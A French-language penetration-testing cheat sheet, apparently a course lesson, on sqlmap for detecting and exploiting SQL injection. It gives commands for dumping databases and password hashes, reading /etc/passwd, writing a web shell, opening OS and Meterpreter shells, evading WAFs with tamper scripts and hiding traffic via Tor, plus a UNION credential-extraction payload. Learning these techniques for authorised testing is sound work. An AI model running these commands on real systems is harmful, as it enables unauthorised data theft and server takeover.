# 18 — SQLMap Essentials

## Objectifs
Automatiser la détection et l'exploitation SQLi avec sqlmap : options, techniques, tamper, extraction, shell, fichiers.

---

## 1. Détection de base

```bash
# GET
sqlmap -u "http://<TARGET>/page.php?id=1" --batch

# POST
sqlmap -u "http://<TARGET>/login" --data "username=admin&password=test" --batch

# Depuis un fichier de requête (Burp → Save item)
sqlmap -r request.txt --batch

# Cookie
sqlmap -u "http://<TARGET>/" --cookie="PHPSESSID=abc; role=user" --batch

# Header
sqlmap -u "http://<TARGET>/" --headers="X-Forwarded-For: 1.1.1.1*" --batch

# JSON
sqlmap -u "http://<TARGET>/api" --data '{"id":1}' --headers="Content-Type: application/json" --batch

# URL avec plusieurs paramètres
sqlmap -u "http://<TARGET>/page.php?id=1&cat=2" -p id
```

---

## 2. Options essentielles

| Option | Effet |
|---|---|
| `--batch` | Aucune question |
| `--dbs` | Lister les bases |
| `--tables` | Lister les tables |
| `--columns` | Lister les colonnes |
| `--dump` | Extraire les données |
| `-D <db> -T <table>` | Cibler |
| `-C col1,col2` | Colonnes précises |
| `--current-db` | Base courante |
| `--current-user` | Utilisateur |
| `--is-dba` | Droits admin |
| `--users` / `--passwords` | Utilisateurs / hashs |
| `--roles` / `--privileges` | Rôles / privilèges |
| `--level=5 --risk=3` | Tests agressifs |
| `--technique=BEUSTQ` | Techniques |
| `--threads=10` | Parallélisme |
| `--random-agent` | UA aléatoire |
| `--tamper=<script>` | Contournement WAF |
| `--os-shell` | Shell système |
| `--file-read` / `--file-write` | Fichiers |
| `--sql-shell` | Shell SQL |
| `--proxy=` | Proxy |
| `--force-ssl` | HTTPS |

### Techniques
| Lettre | Technique |
|---|---|
| `B` | Boolean blind |
| `E` | Error-based |
| `U` | Union |
| `S` | Stacked queries |
| `T` | Time-based |
| `Q` | Inline queries |

---

## 3. Workflow d'extraction

```bash
# 1. Bases
sqlmap -r request.txt --batch --dbs

# 2. Tables
sqlmap -r request.txt --batch -D <DB> --tables

# 3. Colonnes
sqlmap -r request.txt --batch -D <DB> -T users --columns

# 4. Dump
sqlmap -r request.txt --batch -D <DB> -T users -C username,password --dump

# 5. Cracker les hashs automatiquement
sqlmap -r request.txt --batch -D <DB> -T users --dump --passwords

# Tout d'un coup
sqlmap -r request.txt --batch -D <DB> -T users --dump-all --threads=10
```

### Options de dump
```bash
--dump-all --exclude-sysdbs
--start=1 --stop=100
--where="id>10"
--sql-query="SELECT * FROM users"
```

---

## 4. Prise de contrôle

```bash
# Vérifier les privilèges
sqlmap -r request.txt --batch --is-dba
sqlmap -r request.txt --batch --privileges
sqlmap -r request.txt --batch --roles

# Shell système
sqlmap -r request.txt --batch --os-shell
# → choix du langage (PHP/JSP/ASP) + répertoire web

# Shell SQL
sqlmap -r request.txt --batch --sql-shell

# Commandes OS directes
sqlmap -r request.txt --batch --os-cmd="whoami"

# Fichiers
sqlmap -r request.txt --batch --file-read="/etc/passwd"
sqlmap -r request.txt --batch --file-write=shell.php --file-dest="/var/www/html/shell.php"

# Upload + exécution
sqlmap -r request.txt --batch --os-pwn     # Meterpreter / VNC
```

---

## 5. Tamper scripts (WAF)

```bash
ls /usr/share/sqlmap/tamper/

# Exemples
sqlmap ... --tamper=space2comment
sqlmap ... --tamper=between,randomcase,space2comment
sqlmap ... --tamper=charunicodeencode
sqlmap ... --tamper=apostrophemask,apostrophenullencode
sqlmap ... --tamper=modsecurityversioned
sqlmap ... --tamper=charencode
```

### Chaîner les tampers
```bash
sqlmap -r request.txt --batch --tamper=space2comment,between,randomcase --level=5 --risk=3
```

### Liste utile
| Tamper | Usage |
|---|---|
| `space2comment` | remplace les espaces par `/**/` |
| `space2plus` | espaces → `+` |
| `between` | `>` → `NOT BETWEEN 0 AND` |
| `randomcase` | casse aléatoire |
| `charencode` | encode en URL |
| `charunicodeencode` | unicode |
| `apostrophemask` | `'` → `%EF%BC%87` |
| `equaltolike` | `=` → `LIKE` |
| `modsecurityversioned` | contourne ModSecurity |

---

## 6. Performance & discrétion

```bash
# Rapide
--threads=10 --level=3 --risk=2

# Furtif
--delay=2 --randomize=delay --random-agent --tor --check-tor

# Debug
-v 3                 # verbosité
--flush-session      # repartir de zéro
--fresh-queries
--parse-errors
--batch --answers="follow=N"
```

### Reprise
```bash
# Les sessions sont dans ~/.sqlmap/output/<host>/
sqlmap -r request.txt --batch --dbs   # reprend automatiquement
```

---

## 7. Cas particuliers

### Injection dans un ORDER BY
```bash
sqlmap -u "http://<TARGET>/?sort=1" --batch --technique=B
```

### Second-order
```bash
sqlmap -r request.txt --batch --second-order="http://<TARGET>/profile.php"
```

### Fichier de requête Burp
```
POST /login HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

username=admin*&password=test
```
→ `sqlmap -r request.txt --batch` (l'astérisque marque le point d'injection).

---

## 8. Sortie & reporting

```bash
# Répertoire de session
~/.sqlmap/output/<TARGET>/

# Log
--log-file=sqlmap.log

# CSV
--dump -D <DB> -T users --csv-del=";" --output-dir=./dump
```

```sql
-- Requête finale (à mettre dans le rapport)
?id=1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

---

## Checklist
- [ ] Requête sauvegardée depuis Burp
- [ ] Point d'injection confirmé
- [ ] SGBD et privilèges identifiés
- [ ] Bases/tables/colonnes énumérées
- [ ] Données sensibles extraites et hashs crackés
- [ ] RCE / lecture de fichiers testée
- [ ] WAF contourné si besoin
- [ ] Preuves et commandes archivées

## Pièges
- `--os-shell` échoue sans droits d'écriture web ni FILE priv.
- `--dump-all` peut être très long : cibler les tables.
- `--risk=3` peut provoquer des `UPDATE`/`DELETE` → jamais en production.
- Les sessions cachent les résultats : `--flush-session` en cas de doute.
